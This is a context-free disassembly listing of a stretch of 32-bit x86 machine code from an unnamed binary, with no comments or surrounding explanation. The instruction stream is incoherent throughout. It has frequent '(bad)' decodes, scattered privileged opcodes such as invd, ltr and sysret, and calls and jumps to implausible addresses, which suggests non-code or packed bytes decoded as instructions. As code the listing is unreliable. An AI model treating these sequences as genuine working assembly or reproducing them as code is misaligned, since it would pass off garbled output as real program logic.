  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
